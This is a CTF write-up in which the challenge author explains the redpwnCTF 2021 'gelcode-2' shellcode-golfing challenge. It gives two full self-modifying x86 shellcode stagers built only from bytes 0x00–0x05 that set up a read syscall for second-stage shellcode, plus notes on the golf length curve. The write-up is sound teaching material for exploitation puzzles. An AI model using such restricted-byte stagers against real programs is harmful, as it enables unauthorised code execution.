---
title: redpwnCTF 2021 - gelcode-2 (pwn)
date: 2021-07-12
slug: /writeups/redpwnctf-2021-gelcode/
excerpt: Shellcode golfing
author: Darin Mao
---

gelcode-2 was a pwn challenge I wrote for redpwnCTF 2021. It was inspired by a similar challenge called "gelcode" from the recent HSCTF 8. gelcode-2 was more restrictive and was also a golf challenge!

# Solution
The original gelcode challenge was just shellcoding with (practically) no limit on length. The only interesting restriction was that each byte must not be greater than `0x0f`, or else it will be replaced with a NULL `0x00`. This challenge made several changes:

- it's golf! the number of bytes allowed gradually increases until the challenge is solved
- the input is in an rwx page at a fixed address of `0x420691337000` to prevent rip-relative libc access
- there is a seccomp policy that only allows open, read, and write to further prevent libc use
- the maximum byte is `0x05` rather than `0x0f`

## General Tricks
At first, the restrictions may seem too difficult. However, this means there are few possibilities for what instructions we can use. Since the memory is rwx, we can use these instructions to set `eax` and then write new instructions to memory:

- `add al/eax, imm`
- `add byte/dword ptr [rip], al/eax`

Another trick I liked was:

```nasm
add dword ptr [rip+1], eax
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
```

This sequence doubles the value of `eax`, which was handy sometimes.

## Code
Here's all my code:

```nasm
; 13371337 -> 3088438b
add eax, 0x05050505
add eax, 0x05050505
add eax, 0x05050505
add eax, 0x05050505
add eax, 0x05050505
add eax, 0x04050505
add eax, 0x00050505
add eax, 0x00050505
add eax, 0x00050505
add eax, 0x00050305
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00010004
add dword ptr [rip], eax
; creates nop; lea rsi, [rip]
.byte 5
.byte 5
.byte 5
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
; 3088438b
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 2
add byte ptr [rip], al
; creates mov edx, 0x500
.byte 0
.byte 0
.byte 5
.byte 0
.byte 0
add byte ptr [rip], al
; creates mov edi, 0
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
; 308843ba
add dword ptr [rip+1], eax
; double eax
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
; 61108774
add eax, 0x05050505
add eax, 0x05050505
add eax, 0x05050505
add eax, 0x05050205
add eax, 0x05050005
add eax, 0x05050005
add eax, 0x05050005
add eax, 0x01050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00040005
add al, 2
; 855f98c6
add dword ptr [rip+1], eax
; double eax
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
; 0abf318c
add dword ptr [rip], eax
; creates nop; xor eax, eax; syscall
.byte 4
.byte 0
.byte 1
.byte 5
.byte 5
```

If you want to put this into `asm()` from pwntools you'll have to change the comments to `//`.

This payload is 256 bytes long and sets up a read syscall to input normal open/read/write shellcode to get the flag. I used the "double `eax`" trick mostly to save space (instead of several `add` instructions). To find suitable numbers to target, I used `solve_mod` from Sage along with some guess and check. I didn't try that many numbers, and just used the first one I got that seemed reasonable.

## Further Improvements
After the CTF, I realized I could use the "double `eax`" trick at the beginning too, and also use this sequence to save one `add eax, 0x05050505`:

```nasm
add dword ptr [rip+1], eax
.byte 5
.byte 5
.byte 5
.byte 5
.byte 5
```

This results in an even shorter solution:

```nasm
; 13371337
add dword ptr [rip+1], eax
; double eax + 0x05050505
.byte 5
.byte 5
.byte 5
.byte 5
.byte 5
; 2b732b73 -> 3088438b
add eax, 0x05050505
add eax, 0x00050505
add eax, 0x00050505
add eax, 0x00050505
add eax, 0x00010404
add dword ptr [rip], eax
; creates nop; lea rsi, [rip]
.byte 5
.byte 5
.byte 5
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
; 3088438b
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 5
add al, 2
add byte ptr [rip], al
; creates mov edx, 0x500
.byte 0
.byte 0
.byte 5
.byte 0
.byte 0
add byte ptr [rip], al
; creates mov edi, 0
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
; 308843ba
add dword ptr [rip+1], eax
; double eax
.byte 5
.byte 5
.byte 5
.byte 5
.byte 5
; 66158c79
add eax, 0x05050505
add eax, 0x05050505
add eax, 0x05050205
add eax, 0x05050005
add eax, 0x05050005
add eax, 0x05050005
add eax, 0x01050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00050005
add eax, 0x00040005
add al, 2
; 855f98c6
add dword ptr [rip+1], eax
; double eax
.byte 5
.byte 0
.byte 0
.byte 0
.byte 0
; 0abf318c
add dword ptr [rip], eax
; creates nop; xor eax, eax; syscall
.byte 4
.byte 0
.byte 1
.byte 5
.byte 5
```

This is 202 bytes, but could probably be golfed down even more with some code to find optimal places to double `eax`.

# Golf Curve
I wrote my 256 byte solution in one try; that is, I had golfing in mind but only wrote until I had a working solution and did not golf it further from there. Thus, I felt that 256 bytes was a pretty reasonable length limit. The goal was to ensure that the author's solution was accepted within the first half of the CTF, but also to start the limit much lower to allow for more creative solutions. Additionally, the limit at the end of the CTF is supposed to be trivial to solve.

I decided to use a linear function from 50 to 1000, which I thought was pretty fair. I expected someone to come up with some genius idea, but the first team to solve ended up locking the limit at 362. Some other teams later solved it with around 300 bytes, but as far as I know nobody cared enough to golf down to 250.

![lul](./rbtree.png)

let me in the fan club pls
